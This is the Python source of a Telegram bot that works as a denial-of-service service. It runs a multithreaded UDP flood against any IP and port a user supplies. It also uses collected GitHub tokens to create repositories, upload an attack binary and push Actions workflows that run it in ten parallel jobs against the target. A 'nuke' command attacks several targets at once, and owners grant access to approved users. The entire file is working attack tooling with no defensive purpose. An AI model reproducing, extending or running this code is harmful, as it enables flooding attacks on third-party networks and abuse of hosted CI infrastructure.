import os
import sys
import json
import logging
import threading
import time
import uuid
import socket
import random
import asyncio
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler, CallbackQueryHandler
from github import Github

# ============================================================
# ===== RAILWAY FIX – PYTHON 3.11 COMPATIBLE =====
# ============================================================

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_IDS = [int(x.strip()) for x in os.environ.get("ADMIN_IDS", "").split(",") if x.strip()]
MAX_THREADS = min(int(os.environ.get("MAX_THREADS", "150")), 300)
MAX_DURATION = int(os.environ.get("MAX_DURATION", "600"))
PACKET_SIZE = min(int(os.environ.get("PACKET_SIZE", "1024")), 1400)

if not BOT_TOKEN:
    print("❌ BOT_TOKEN not set!")
    sys.exit(1)

# ===== LOGGING =====
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== CONSTANTS =====
YML_FILE_PATH = ".github/workflows/main.yml"
BINARY_NAME = "spider"
WAITING_FOR_BINARY = 1

# ===== GLOBALS =====
current_attack = None
github_tokens = []
owners = {}
approved_users = {}
pending_users = {}
maintenance_mode = False

# ============================================================
# ===== FILE OPERATIONS =====
# ============================================================

def load_json(filename, default=None):
    try:
        with open(filename, 'r') as f:
            return json.load(f)
    except:
        return default if default is not None else {}

def save_json(filename, data):
    with open(filename, 'w') as f:
        json.dump(data, f, indent=2)

def load_owners():
    global owners
    owners = load_json('owners.json', {})
    if not owners:
        for admin_id in ADMIN_IDS:
            owners[str(admin_id)] = {"username": f"owner_{admin_id}", "is_primary": True}
        save_json('owners.json', owners)
    return owners

def load_github_tokens():
    global github_tokens
    github_tokens = load_json('github_tokens.json', [])
    return github_tokens

def load_approved_users():
    global approved_users
    approved_users = load_json('approved_users.json', {})
    return approved_users

def load_pending_users():
    global pending_users
    pending_users = load_json('pending_users.json', [])
    return pending_users

# ===== INIT =====
load_owners()
load_github_tokens()
load_approved_users()
load_pending_users()

# ============================================================
# ===== HELPERS =====
# ============================================================

def is_owner(user_id):
    return str(user_id) in owners

def is_approved(user_id):
    return str(user_id) in approved_users

def can_attack(user_id):
    return is_owner(user_id) or is_approved(user_id)

def start_attack(ip, port, time_val, user_id):
    global current_attack
    current_attack = {
        "ip": ip,
        "port": port,
        "time": int(time_val),
        "user_id": user_id,
        "start_time": time.time()
    }
    save_json('attack_state.json', current_attack)

def finish_attack():
    global current_attack
    current_attack = None
    save_json('attack_state.json', None)

def is_attack_running():
    if current_attack:
        elapsed = int(time.time() - current_attack['start_time'])
        if elapsed >= current_attack['time']:
            finish_attack()
            return False
        return True
    return False

# ============================================================
# ===== EXTREME ATTACK ENGINE =====
# ============================================================

class ExtremeAttack:
    def __init__(self, ip, port, duration, threads=MAX_THREADS):
        self.ip = ip
        self.port = port
        self.duration = min(duration, MAX_DURATION)
        self.threads = min(threads, MAX_THREADS)
        self.running = False
        self.packets_sent = 0
        self.bytes_sent = 0
        self.start_time = 0
        self.stop_event = threading.Event()
        self.executor = ThreadPoolExecutor(max_workers=self.threads)
        self._payloads = self._generate_payloads()
        
    def _generate_payloads(self):
        payloads = []
        for _ in range(50):
            size = random.randint(64, PACKET_SIZE)
            payloads.append(os.urandom(size))
        return payloads
    
    def _udp_flood(self, thread_id):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(0.1)
            
            src_port = random.randint(10000, 65535)
            sock.bind(('0.0.0.0', src_port))
            
            while not self.stop_event.is_set():
                try:
                    payload = random.choice(self._payloads)
                    sock.sendto(payload, (self.ip, self.port))
                    self.packets_sent += 1
                    self.bytes_sent += len(payload)
                except:
                    pass
            
            sock.close()
        except:
            pass
    
    def start(self):
        self.running = True
        self.start_time = time.time()
        self.stop_event.clear()
        
        for i in range(self.threads):
            self.executor.submit(self._udp_flood, i)
        
        threading.Timer(self.duration, self.stop).start()
        return self
    
    def stop(self):
        self.running = False
        self.stop_event.set()
        self.executor.shutdown(wait=False)
    
    def get_stats(self):
        elapsed = time.time() - self.start_time if self.start_time else 0
        rps = self.packets_sent / elapsed if elapsed > 0 else 0
        mbps = (self.bytes_sent * 8 / 1024 / 1024) / elapsed if elapsed > 0 else 0
        return {
            "packets": self.packets_sent,
            "bytes": self.bytes_sent,
            "elapsed": int(elapsed),
            "rps": int(rps),
            "mbps": round(mbps, 2)
        }

# ============================================================
# ===== EXTREME ATTACK FUNCTIONS =====
# ============================================================

def start_extreme_attack(ip, port, duration, user_id):
    global current_attack
    attack = ExtremeAttack(ip, port, duration)
    attack.start()
    current_attack = {
        "ip": ip,
        "port": port,
        "duration": duration,
        "user_id": user_id,
        "start_time": time.time(),
        "attack_obj": attack
    }
    save_json('attack_state.json', current_attack)
    return attack

def stop_extreme_attack():
    global current_attack
    if current_attack and current_attack.get('attack_obj'):
        current_attack['attack_obj'].stop()
    current_attack = None
    save_json('attack_state.json', None)

def is_extreme_attack_running():
    global current_attack
    if current_attack:
        elapsed = int(time.time() - current_attack['start_time'])
        if elapsed >= current_attack['duration']:
            stop_extreme_attack()
            return False
        return True
    return False

# ============================================================
# ===== GITHUB WORKFLOW TRIGGER =====
# ============================================================

def trigger_github_attacks(ip, port, duration):
    if not github_tokens:
        return 0, 0, ["❌ No tokens"]
    
    success = 0
    failed = 0
    results = []
    
    for token_data in github_tokens:
        try:
            g = Github(token_data['token'])
            repo = g.get_repo(token_data['repo'])
            
            yml_content = f"""name: attack-{uuid.uuid4().hex[:4]}
on: [push]
jobs:
  attack:
    runs-on: ubuntu-24.04
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7,8,9,10]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x {BINARY_NAME}
    - run: ./{BINARY_NAME} {ip} {port} {duration} 350
"""
            try:
                file = repo.get_contents(YML_FILE_PATH)
                repo.update_file(YML_FILE_PATH, f"Attack {ip}:{port}", yml_content, file.sha)
                success += 1
                results.append(f"✅ @{token_data['username']}: Updated")
            except:
                repo.create_file(YML_FILE_PATH, f"Attack {ip}:{port}", yml_content)
                success += 1
                results.append(f"✅ @{token_data['username']}: Created")
        except Exception as e:
            failed += 1
            results.append(f"❌ {token_data.get('username', 'unknown')}: {str(e)[:30]}")
    
    return success, failed, results

# ============================================================
# ===== BINARY UPLOAD HANDLER =====
# ============================================================

async def binary_upload_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can upload binary.")
        return ConversationHandler.END
    
    await update.message.reply_text(
        "📤 **Send me the `spider` binary file**\n\n"
        "File name must be exactly: `spider`\n"
        "Send /cancel to cancel."
    )
    return WAITING_FOR_BINARY

async def binary_upload_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can upload binary.")
        return ConversationHandler.END
    
    if not update.message.document:
        await update.message.reply_text("❌ Please send a file.")
        return WAITING_FOR_BINARY
    
    file = update.message.document
    file_name = file.file_name
    
    if file_name != "spider":
        await update.message.reply_text(
            f"❌ File must be named `spider`.\n"
            f"Current: `{file_name}`\n\n"
            f"Rename to `spider` and try again."
        )
        return WAITING_FOR_BINARY
    
    if not github_tokens:
        await update.message.reply_text("❌ No GitHub tokens. Add token first with /addtoken")
        return ConversationHandler.END
    
    progress = await update.message.reply_text("📤 Uploading to GitHub repositories...")
    
    success_count = 0
    fail_count = 0
    results = []
    
    file_obj = await file.get_file()
    file_path = f"temp_{file.file_id}.bin"
    await file_obj.download_to_drive(file_path)
    
    with open(file_path, 'rb') as f:
        content = f.read()
    
    os.remove(file_path)
    
    for token_data in github_tokens:
        try:
            g = Github(token_data['token'])
            repo = g.get_repo(token_data['repo'])
            
            try:
                existing = repo.get_contents("spider")
                repo.update_file("spider", "Update spider binary", content, existing.sha)
                results.append((token_data['username'], True, "Updated"))
            except:
                repo.create_file("spider", "Add spider binary", content)
                results.append((token_data['username'], True, "Created"))
            success_count += 1
        except Exception as e:
            results.append((token_data['username'], False, str(e)[:50]))
            fail_count += 1
    
    msg = (
        f"✅ **Binary Upload Complete!**\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"✅ Success: {success_count}\n"
        f"❌ Failed: {fail_count}\n"
        f"📊 Total: {len(github_tokens)}\n"
        f"━━━━━━━━━━━━━━━━━\n"
    )
    
    for username, success, status in results:
        if success:
            msg += f"✅ @{username}: {status}\n"
        else:
            msg += f"❌ @{username}: Failed\n"
    
    await progress.edit_text(msg)
    return ConversationHandler.END

async def binary_upload_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Binary upload cancelled.")
    return ConversationHandler.END

# ============================================================
# ===== COMMANDS =====
# ============================================================

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "NoUsername"
    
    if can_attack(user_id):
        keyboard = [
            [InlineKeyboardButton("⚡ Attack", callback_data="attack_help")],
            [InlineKeyboardButton("📊 Status", callback_data="status")],
            [InlineKeyboardButton("🛑 Stop", callback_data="stop")],
            [InlineKeyboardButton("💥 Nuke", callback_data="nuke_help")],
        ]
        if is_owner(user_id):
            keyboard.append([InlineKeyboardButton("🔧 Admin Panel", callback_data="admin_panel")])
        
        await update.message.reply_text(
            f"🔥 **Extreme Bot Active!**\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"👤 User: @{username}\n"
            f"🎯 Role: {'👑 Owner' if is_owner(user_id) else '✅ Approved'}\n"
            f"🧵 Threads: {MAX_THREADS}\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"Commands:\n"
            f"⚡ /attack <ip> <port> <time>\n"
            f"💥 /nuke <ip:port> <ip:port> <time>\n"
            f"📊 /status\n"
            f"🛑 /stop",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    else:
        if not any(str(u.get('user_id')) == str(user_id) for u in pending_users):
            pending_users.append({
                "user_id": user_id,
                "username": username,
                "request_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            })
            save_json('pending_users.json', pending_users)
            
            for owner_id in owners.keys():
                try:
                    await context.bot.send_message(
                        chat_id=int(owner_id),
                        text=f"📥 **New Access Request**\nUser: @{username}\nID: `{user_id}`\nUse: /approve {user_id} 7"
                    )
                except:
                    pass
        
        await update.message.reply_text(
            "❌ **Access Denied**\n\n"
            "Your request has been sent to the owner.\n"
            "Please wait for approval."
        )

# ----- EXTREME ATTACK -----
async def attack_extreme(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "User"
    
    if maintenance_mode and not is_owner(user_id):
        await update.message.reply_text("🔧 Bot is under maintenance.")
        return
    
    if not can_attack(user_id):
        await update.message.reply_text("❌ Access Denied")
        return
    
    if len(context.args) != 3:
        await update.message.reply_text(
            "⚡ **Extreme Attack**\n"
            "━━━━━━━━━━━━━━━━━\n"
            "Usage: `/attack <ip> <port> <time>`\n"
            "Example: `/attack 1.1.1.1 80 60`\n\n"
            "🔥 Features:\n"
            f"• Local UDP Flood ({MAX_THREADS} threads)\n"
            "• GitHub Actions (10× parallel)\n"
            "• Real-time stats"
        )
        return
    
    ip, port_str, time_str = context.args
    try:
        port = int(port_str)
        duration = min(int(time_str), MAX_DURATION)
    except:
        await update.message.reply_text("❌ Invalid numbers")
        return
    
    if not (1 <= port <= 65535) or duration < 5:
        await update.message.reply_text("❌ Port: 1-65535, Time: 5+ sec")
        return
    
    if is_extreme_attack_running():
        await update.message.reply_text(f"⚠️ Attack already running")
        return
    
    msg = await update.message.reply_text(
        f"🔥 **EXTREME ATTACK INITIATED**\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"🎯 Target: `{ip}:{port}`\n"
        f"⏱️ Duration: `{duration}s`\n"
        f"🧵 Threads: `{MAX_THREADS}`\n"
        f"👤 By: @{username}\n"
        f"━━━━━━━━━━━━━━━━━"
    )
    
    start_extreme_attack(ip, port, duration, user_id)
    success, failed, results = trigger_github_attacks(ip, port, duration)
    
    await msg.edit_text(
        f"🔥 **EXTREME ATTACK RUNNING**\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"🎯 Target: `{ip}:{port}`\n"
        f"⏱️ Duration: `{duration}s`\n"
        f"🧵 Threads: `{MAX_THREADS}`\n"
        f"📡 Local UDP: ✅ Active\n"
        f"📤 GitHub: ✅ {success} workflows\n"
        f"━━━━━━━━━━━━━━━━━"
    )
    
    for _ in range(min(duration // 10, 10)):
        await asyncio.sleep(10)
        if current_attack:
            attack_obj = current_attack.get('attack_obj')
            if attack_obj and attack_obj.running:
                stats = attack_obj.get_stats()
                try:
                    await update.message.reply_text(
                        f"📊 **Attack Stats**\n"
                        f"━━━━━━━━━━━━━━━━━\n"
                        f"📦 Packets: `{stats['packets']:,}`\n"
                        f"📈 RPS: `{stats['rps']:,}`\n"
                        f"💾 Data: `{stats['bytes']/1024/1024:.1f} MB`\n"
                        f"⚡ Speed: `{stats['mbps']} Mbps`\n"
                        f"⏱️ Elapsed: `{stats['elapsed']}s`"
                    )
                except:
                    pass

# ----- NUKE COMMAND -----
async def nuke_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if maintenance_mode and not is_owner(user_id):
        await update.message.reply_text("🔧 Bot is under maintenance.")
        return
    
    if not can_attack(user_id):
        await update.message.reply_text("❌ Access Denied")
        return
    
    args = context.args
    if len(args) < 4:
        await update.message.reply_text(
            "💥 **Nuke Command**\n"
            "━━━━━━━━━━━━━━━━━\n"
            "Usage: `/nuke <ip1:port1> <ip2:port2> <duration>`\n"
            "Example: `/nuke 1.1.1.1:80 2.2.2.2:443 60`\n\n"
            "🔥 Attacks all targets simultaneously!"
        )
        return
    
    targets = []
    duration = 30
    
    for arg in args:
        if ":" in arg:
            parts = arg.split(":")
            if len(parts) == 2:
                try:
                    targets.append((parts[0], int(parts[1])))
                except:
                    pass
        else:
            try:
                duration = min(int(arg), MAX_DURATION)
            except:
                pass
    
    if not targets:
        await update.message.reply_text("❌ No valid targets found")
        return
    
    msg = f"💥 **NUKE LAUNCHED**\n━━━━━━━━━━━━━━━━━\n"
    for ip, port in targets:
        msg += f"🎯 `{ip}:{port}`\n"
    msg += f"⏱️ {duration}s\n"
    msg += f"📡 Targets: {len(targets)}\n━━━━━━━━━━━━━━━━━"
    
    await update.message.reply_text(msg)
    
    for ip, port in targets:
        start_extreme_attack(ip, port, duration, user_id)
        trigger_github_attacks(ip, port, duration)
        await asyncio.sleep(0.5)
    
    await update.message.reply_text(f"✅ Nuke complete on {len(targets)} targets")

# ----- STATUS -----
async def status_extreme(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not can_attack(user_id):
        await update.message.reply_text("❌ Access Denied")
        return
    
    global current_attack
    if current_attack and current_attack.get('attack_obj'):
        attack_obj = current_attack['attack_obj']
        if attack_obj.running:
            stats = attack_obj.get_stats()
            await update.message.reply_text(
                f"🔥 **Attack Status**\n"
                f"━━━━━━━━━━━━━━━━━\n"
                f"🎯 Target: `{current_attack['ip']}:{current_attack['port']}`\n"
                f"🧵 Threads: `{attack_obj.threads}`\n"
                f"📦 Packets: `{stats['packets']:,}`\n"
                f"📈 RPS: `{stats['rps']:,}`\n"
                f"💾 Data: `{stats['bytes']/1024/1024:.1f} MB`\n"
                f"⚡ Speed: `{stats['mbps']} Mbps`\n"
                f"⏱️ Elapsed: `{stats['elapsed']}s`"
            )
            return
    
    await update.message.reply_text("✅ No attack running")

# ----- STOP -----
async def stop_extreme(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not can_attack(user_id):
        await update.message.reply_text("❌ Access Denied")
        return
    
    global current_attack
    if current_attack:
        target = f"{current_attack['ip']}:{current_attack['port']}"
        stop_extreme_attack()
        await update.message.reply_text(f"🛑 Attack stopped on `{target}`")
    else:
        await update.message.reply_text("✅ No attack running")

# ----- HELP -----
async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 **Extreme Bot Commands**\n"
        "━━━━━━━━━━━━━━━━━\n"
        "/start - Menu\n"
        "/attack <ip> <port> <time> - Start attack\n"
        "/nuke <ip:port> <ip:port> <time> - Multi-target\n"
        "/status - Attack stats\n"
        "/stop - Stop attack\n"
        "/help - This menu\n"
        "/myid - Get user ID\n\n"
        "**Admin Only:**\n"
        "/addtoken <token> - Add GitHub token\n"
        "/tokens - List tokens\n"
        "/binary_upload - Upload binary\n"
        "/approve <id> <days> - Approve user\n"
        "/remove <id> - Remove user\n"
        "/users - List users\n"
        "/pending - Pending requests\n"
        "/broadcast <msg> - Broadcast\n"
        "/maintenance <on/off> - Maintenance"
    )

async def myid_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"🆔 Your ID: `{update.effective_user.id}`")

# ============================================================
# ===== ADMIN COMMANDS =====
# ============================================================

async def addtoken_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can add tokens.")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /addtoken <github_token>")
        return
    
    token = context.args[0]
    try:
        g = Github(token)
        user = g.get_user()
        username = user.login
        
        for t in github_tokens:
            if t.get('token') == token:
                await update.message.reply_text("❌ Token already added.")
                return
        
        repo_name = f"spider-{uuid.uuid4().hex[:8]}"
        repo = user.create_repo(repo_name, private=False, auto_init=True)
        
        github_tokens.append({
            'token': token,
            'username': username,
            'repo': f"{username}/{repo_name}"
        })
        save_json('github_tokens.json', github_tokens)
        
        await update.message.reply_text(
            f"✅ **Token Added!**\n"
            f"👤 @{username}\n"
            f"📁 Repo: `{repo_name}`\n"
            f"📊 Total: {len(github_tokens)}"
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:200]}")

async def tokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can view tokens.")
        return
    
    if not github_tokens:
        await update.message.reply_text("📭 No tokens added.")
        return
    
    msg = "📋 **GitHub Tokens**\n━━━━━━━━━━━━━━━━━\n"
    for i, t in enumerate(github_tokens, 1):
        msg += f"{i}. @{t['username']} - `{t['repo']}`\n"
    await update.message.reply_text(msg)

async def approve_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can approve users.")
        return
    
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /approve <user_id> <days>")
        return
    
    try:
        target_id = int(context.args[0])
        days = int(context.args[1])
        
        pending_users[:] = [u for u in pending_users if str(u.get('user_id')) != str(target_id)]
        save_json('pending_users.json', pending_users)
        
        expiry = "LIFETIME" if days == 0 else time.time() + (days * 24 * 3600)
        approved_users[str(target_id)] = {
            "username": f"user_{target_id}",
            "added_by": user_id,
            "expiry": expiry,
            "days": days
        }
        save_json('approved_users.json', approved_users)
        
        await update.message.reply_text(f"✅ User `{target_id}` approved for {days} days.")
        
        try:
            await context.bot.send_message(target_id, "✅ Access Granted! Use /start")
        except:
            pass
    except:
        await update.message.reply_text("❌ Invalid input.")

async def removeuser_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can remove users.")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /remove <user_id>")
        return
    
    try:
        target_id = int(context.args[0])
        if str(target_id) in approved_users:
            del approved_users[str(target_id)]
            save_json('approved_users.json', approved_users)
            await update.message.reply_text(f"✅ User {target_id} removed.")
        else:
            await update.message.reply_text("❌ User not found.")
    except:
        await update.message.reply_text("❌ Invalid input.")

async def users_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can view users.")
        return
    
    if not approved_users:
        await update.message.reply_text("📭 No approved users.")
        return
    
    msg = "👤 **Approved Users**\n━━━━━━━━━━━━━━━━━\n"
    for uid, data in approved_users.items():
        msg += f"`{uid}` - {data.get('days', '?')}d\n"
    await update.message.reply_text(msg)

async def pending_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can view pending.")
        return
    
    if not pending_users:
        await update.message.reply_text("📭 No pending requests.")
        return
    
    msg = "⏳ **Pending Requests**\n━━━━━━━━━━━━━━━━━\n"
    for u in pending_users:
        msg += f"`{u.get('user_id')}` - @{u.get('username')}\n"
    await update.message.reply_text(msg)

async def broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can broadcast.")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /broadcast <message>")
        return
    
    msg = " ".join(context.args)
    sent = 0
    
    for uid in owners.keys():
        try:
            await context.bot.send_message(int(uid), f"📢 {msg}")
            sent += 1
        except:
            pass
    
    for uid in approved_users.keys():
        try:
            await context.bot.send_message(int(uid), f"📢 {msg}")
            sent += 1
        except:
            pass
    
    await update.message.reply_text(f"✅ Sent to {sent} users.")

async def maintenance_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("❌ Only owners can toggle maintenance.")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /maintenance <on/off>")
        return
    
    global maintenance_mode
    mode = context.args[0].lower()
    if mode == "on":
        maintenance_mode = True
        save_json('maintenance.json', {"maintenance": True})
        await update.message.reply_text("🔧 Maintenance ENABLED.")
    elif mode == "off":
        maintenance_mode = False
        save_json('maintenance.json', {"maintenance": False})
        await update.message.reply_text("✅ Maintenance DISABLED.")
    else:
        await update.message.reply_text("❌ Use 'on' or 'off'.")

# ============================================================
# ===== CALLBACKS =====
# ============================================================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    data = query.data
    
    if data == "attack_help":
        await query.edit_message_text("⚡ Use: /attack <ip> <port> <time>")
    elif data == "nuke_help":
        await query.edit_message_text("💥 Use: /nuke <ip:port> <ip:port> <time>")
    elif data == "status":
        await status_extreme(update, context)
    elif data == "stop":
        await stop_extreme(update, context)
    elif data == "admin_panel" and is_owner(user_id):
        keyboard = [
            [InlineKeyboardButton("📋 Tokens", callback_data="admin_tokens")],
            [InlineKeyboardButton("👥 Users", callback_data="admin_users")],
            [InlineKeyboardButton("⏳ Pending", callback_data="admin_pending")],
            [InlineKeyboardButton("📤 Binary", callback_data="admin_binary")],
            [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")],
        ]
        await query.edit_message_text("🔧 **Admin Panel**", reply_markup=InlineKeyboardMarkup(keyboard))
    elif data == "admin_tokens":
        await tokens_cmd(update, context)
    elif data == "admin_users":
        await users_cmd(update, context)
    elif data == "admin_pending":
        await pending_cmd(update, context)
    elif data == "admin_binary":
        await query.edit_message_text("📤 Use: /binary_upload")
    elif data == "admin_broadcast":
        await query.edit_message_text("📢 Use: /broadcast <message>")

# ============================================================
# ===== ERROR HANDLER =====
# ============================================================

async def error_handler(update, context):
    logger.error(f"Error: {context.error}")
    if update and update.effective_message:
        try:
            await update.effective_message.reply_text("⚠️ Error occurred. Try again.")
        except:
            pass

# ============================================================
# ===== MAIN =====
# ============================================================

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Binary upload conversation
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("binary_upload", binary_upload_start)],
        states={
            WAITING_FOR_BINARY: [
                MessageHandler(filters.Document.ALL, binary_upload_receive),
                CommandHandler("cancel", binary_upload_cancel)
            ],
        },
        fallbacks=[CommandHandler("cancel", binary_upload_cancel)]
    )
    app.add_handler(conv_handler)
    
    # Commands - EXTREME VERSION
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("attack", attack_extreme))
    app.add_handler(CommandHandler("nuke", nuke_cmd))
    app.add_handler(CommandHandler("status", status_extreme))
    app.add_handler(CommandHandler("stop", stop_extreme))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("myid", myid_cmd))
    
    # Admin
    app.add_handler(CommandHandler("addtoken", addtoken_cmd))
    app.add_handler(CommandHandler("tokens", tokens_cmd))
    app.add_handler(CommandHandler("approve", approve_cmd))
    app.add_handler(CommandHandler("remove", removeuser_cmd))
    app.add_handler(CommandHandler("users", users_cmd))
    app.add_handler(CommandHandler("pending", pending_cmd))
    app.add_handler(CommandHandler("broadcast", broadcast_cmd))
    app.add_handler(CommandHandler("maintenance", maintenance_cmd))
    
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_error_handler(error_handler)
    
    logger.info("🚀 EXTREME BOT is running!")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
